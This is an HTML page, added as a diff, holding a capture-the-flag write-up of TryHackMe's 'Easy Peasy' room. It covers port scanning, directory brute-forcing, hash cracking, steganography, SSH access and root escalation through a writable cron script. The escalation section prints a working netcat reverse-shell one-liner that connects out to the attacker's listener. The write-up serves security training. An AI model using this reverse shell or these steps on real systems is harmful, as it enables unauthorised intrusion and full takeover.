@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Peasy CTF Write-up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-body: #121212;
+            --bg-card: #1e1e1e;
+            --bg-sidebar: #181818;
+            --text-main: #e0e0e0;
+            --text-muted: #a0a0a0;
+            --accent: #00bcd4;
+            --accent-hover: #008ba3;
+            --border: #333333;
+            --code-bg: #2d2d2d;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            display: flex;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+        }
+
+        .sidebar-nav {
+            margin-top: 40px;
+            width: 100%;
+        }
+
+        .back-link {
+            display: block;
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 20px;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: #fff;
+        }
+
+        .article-content {
+            flex: 1;
+            padding: 50px 80px;
+            overflow-y: auto;
+            line-height: 1.8;
+        }
+
+        .machine-info,
+        .toc {
+            width: 100%;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .machine-info h3,
+        .toc h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .machine-info ul,
+        .toc ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .machine-info li {
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            text-decoration: none;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            transition: color 0.2s, padding-left 0.2s;
+            display: block;
+        }
+
+        .toc a:hover {
+            color: var(--accent);
+            padding-left: 5px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        p {
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff79c6;
+        }
+
+        .cmd-output {
+            color: #8be9fd;
+        }
+
+        img.screenshot {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .meta-tags {
+            margin-bottom: 40px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .tag {
+            background-color: var(--bg-card);
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-right: 10px;
+            border: 1px solid var(--border);
+        }
+
+        @media (max-width: 768px) {
+            .app-container {
+                flex-direction: column;
+            }
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+            }
+            .article-content {
+                padding: 30px 20px;
+            }
+        }
+
+        .tools-section {
+            width: 100%;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .tools-section h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .tool-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .tool-badge {
+            background-color: #252526;
+            color: #e0e0e0;
+            font-size: 0.8rem;
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            cursor: default;
+            transition: all 0.2s ease;
+        }
+
+        .tool-badge:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="sidebar-nav">
+                <a href="../index.html" class="back-link">← Back to Home</a>
+            </div>
+
+            <div class="machine-info">
+                <h3>Target Info</h3>
+                <ul>
+                    <li><strong>Name:</strong> Easy Peasy</li>
+                    <li><strong>Site:</strong> TryHackMe</li>
+                    <li><strong>OS:</strong> <span style="color: #ff79c6;">Linux</span></li>
+                    <li><strong>Difficulty:</strong> <span style="color: #50fa7b;">Easy</span></li>
+                </ul>
+            </div>
+
+            <div class="toc">
+                <h3>Table of Contents</h3>
+                <ul>
+                    <li><a href="#recon">1. Reconnaissance</a></li>
+                    <li><a href="#web">2. Web Enumeration</a></li>
+                    <li><a href="#hashing">3. Hash Cracking</a></li>
+                    <li><a href="#stego">4. Steganography</a></li>
+                    <li><a href="#user">5. User Access</a></li>
+                    <li><a href="#privesc">6. Privilege Escalation</a></li>
+                </ul>
+            </div>
+            <div class="tools-section">
+                <h3>Tools Arsenal</h3>
+                <div class="tool-tags">
+                    <span class="tool-badge">Nmap</span>
+                    <span class="tool-badge">Gobuster</span>
+                    <span class="tool-badge">Hashcat</span>
+                    <span class="tool-badge">Steghide</span>
+                    <span class="tool-badge">Linpeas</span>
+                </div>
+            </div>
+            <div style="text-align: center; color: var(--text-muted); margin-top: auto;">
+                <p>Created by <strong style="color: #fff;">Kontowsky</strong></p>
+            </div>
+        </aside>
+
+        <article class="article-content">
+
+            <h1>Easy Peasy CTF</h1>
+            <div class="meta-tags">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">Steganography</span>
+                <span class="tag">Cracking</span>
+                <span class="tag">Dec 06, 2025</span>
+            </div>
+
+            <p>
+                In this write-up, we tackle the "Easy Peasy" room from TryHackMe. We will go through enumeration, 
+                hiding data in images (steganography), hash cracking, and exploiting system misconfigurations.
+		<br>Link to the room: <a href="https://tryhackme.com/room/easypeasyctf" target="_blank">https://tryhackme.com/room/easypeasyctf</a>
+            </p>
+
+            <h2 id="recon">1. Reconnaissance</h2>
+            <p>
+                First, I started my reconnaissance with a basic Nmap scan.
+            </p>
+            <pre><code>$ sudo nmap -T4 10.80.147.162</code></pre>
+
+            <img src="images_easy-peasy/image-343.png" alt="Nmap Basic Scan" class="screenshot">
+
+            <p>
+                In the basic scan, we only saw one open port (80). This wasn't a correct answer to the first question abou number of ports that are open, so I decided to dig deeper 
+                and started a full port scan to find hidden services.
+            </p>
+            <pre><code>$ sudo nmap -p- -T4 10.80.147.162</code></pre>
+            
+            <img src="images_easy-peasy/image-344.png" alt="Nmap Full Scan" class="screenshot">
+
+            <p>
+                And now we see two more ports: <strong>6498</strong> and <strong>65524</strong>! Let's look closer into them.
+            </p>
+            <pre><code>$ sudo nmap -sV -p80,6498,65524 -T4 10.80.147.162</code></pre>
+
+            <img src="images_easy-peasy/image-345.png" alt="Nmap Service Scan" class="screenshot">
+            
+            <p>
+                We discovered SSH on port 6498 and another HTTP service (Apache) on port 65524.
+            </p>
+
+            <h2 id="web">2. Web Enumeration</h2>
+            <p>
+                All web servers showed default pages (Nginx and Apache), which was a bit boring. 
+                In the meantime, I checked <code>robots.txt</code> on the port 65524 server and found something interesting.
+            </p>
+            
+            <img src="images_easy-peasy/image-346.png" alt="Robots.txt" class="screenshot">
+            
+            <p>
+                While analyzing that, I ran Gobuster on the main HTTP service (port 80) to look for hidden directories.
+            </p>
+            <pre><code>$ gobuster dir -u http://10.80.147.162 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html</code></pre>
+
+            <img src="images_easy-peasy/image-347.png" alt="Gobuster Scan" class="screenshot">
+
+            <p>
+                After some time, Gobuster found a hidden directory and I navigate to this site.
+            </p>
+            <img src="images_easy-peasy/image-348.png" alt="Hidden Directory" class="screenshot">
+            
+            <p>
+                Navigating further, I found another page titled "dead end".
+            </p>
+            <img src="images_easy-peasy/image-349.png" alt="Dead End" class="screenshot">
+
+            <p>
+                I checked the source code and found text encoded in Base64.
+            </p>
+            <img src="images_easy-peasy/image-350.png" alt="Source Code Base64" class="screenshot">
+            
+            <p>
+                It turned out, after decoding, that this was the first flag we needed! So let's continue deeper enumeration.
+            </p>
+
+            <p>
+                Some time passed, and after casually looking at the Apache default page on port 65524 again, I noticed something funny one of the flags was in the text on the site. I also look into source code of that site.
+            </p>
+            <img src="images_easy-peasy/image-351.png" alt="Apache Page" class="screenshot">
+            <img src="images_easy-peasy/image-352.png" alt="Hidden Base62" class="screenshot">
+
+            <p>
+                The hint said "its encoded with ba...". My first thought was Base64, but decoding it didn't work. 
+                I tried a few other Base variations (like Base32). Finally, it turned out to be <strong>Base62</strong>, 
+                which led me to a hidden directory.
+            </p>
+
+            <h2 id="hashing">3. Hash Cracking</h2>
+            <p>
+                Inside the source code of that new directory, I found a hash.
+            </p>
+            <img src="images_easy-peasy/image-353.png" alt="Hidden Hash" class="screenshot">
+
+            <p>
+                I wasn't sure what algorithm it was. I checked hash types that hashcat detect, it suggested a few possibilities, including SHA256 and GOST.
+
+            <p>
+                I decided to try cracking it with Hashcat using the <code>easypeasy.txt</code> wordlist, provided by author of the room. 
+                After some tries with different hash types, I successfully identified it as <strong>GOST R 34.11-94</strong> (mode 6900).
+            </p>
+            <pre><code>$ hashcat -m 6900 hash.txt easypeasy.txt</code></pre>
+
+            <img src="images_easy-peasy/image-355.png" alt="Hashcat Cracked" class="screenshot">
+            
+            <p>
+                Success! The password was recovered.
+            </p>
+
+            <h2 id="stego">4. Steganography</h2>
+            <p>
+                At first, I didn't know where this password should be used. But I remembered that when inspecting the source code of the site 
+                where I found the hash, one image (<code>binarycodepixabay.jpg</code>) was linked differently than others.
+            </p>
+	    <img src="images_easy-peasy/image-356.png" alt="Steghide Extract" class="screenshot">
+            <p>
+                I downloaded it and used <strong>Steghide</strong> with the password I just cracked.
+            </p>
+            <pre><code>$ steghide extract -sf binarycodepixabay.jpg</code></pre>
+
+	    <img src="images_easy-peasy/image-357.png" alt="Secret Text" class="screenshot">
+            <p>
+                It extracted a file named <code>secrettext.txt</code>.
+            </p>
+            
+            <p>
+                Inside this file, I found a username and password represented in binary. After converting it to text, 
+                I used those credentials to login to the machine via SSH.
+            </p>
+
+            <h2 id="user">5. User Access</h2>
+            <p>
+                I logged in via SSH using the credentials found. I found <code>user.txt</code>, but something was wrong.
+                The flag seemed rotated or encoded.
+            </p>
+            <img src="images_easy-peasy/image-358.png" alt="SSH and User Flag" class="screenshot">
+            
+            <p>
+                Decoding it, gave me the correct user flag: <code>[REDACTED]</code>.
+            </p>
+
+            <h2 id="privesc">6. Privilege Escalation</h2>
+            <p>
+                To escalate privileges, I transferred <strong>linpeas.sh</strong> to the target machine using <code>wget</code>.
+            </p>
+            <img src="images_easy-peasy/image-359.png" alt="Linpeas Transfer" class="screenshot">
+
+            <p>
+                Running Linpeas revealed a writable script that seemed to be a file that is being executed by cronjob.
+		Text inside says that script is being run as root.
+            </p>
+            <img src="images_easy-peasy/image-360.png" alt="Linpeas Result" class="screenshot">
+            <img src="images_easy-peasy/image-361.png" alt="Vulnerable Script" class="screenshot">
+
+            <p>
+                I modified the script to include a reverse shell payload connecting back to my listener.
+            </p>
+            <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.228 4444 >/tmp/f</code></pre>
+            
+            <img src="images_easy-peasy/image-362.png" alt="Payload" class="screenshot">
+
+            <p>
+                After waiting for the cronjob to run, I received a root shell and captured the root flag!
+            </p>
+            <img src="images_easy-peasy/image-363.png" alt="Root Flag" class="screenshot">
+            
+            <p>
+                <strong>Root Flag:</strong> <code>[REDACTED]</code>
+            </p>
+
+            <p>
+                The last thing I hadn't found yet was Flag 2, so I tried to lookup for it. 
+                I came back to the one thing I didn't use — the information in <code>robots.txt</code>.
+            </p>
+            <p>
+                I investigated and realized it was an MD5 hash. I tried some online hash decoders to crack it.
+            </p>
+            <img src="images_easy-peasy/image-364.png" alt="MD5 Crack" class="screenshot">
+            
+            <p>
+                And after some time, we have our last flag: <code>[REDACTED]</code>.
+            </p>
+
+        </article>
+    </div>
+
+</body>
+</html>
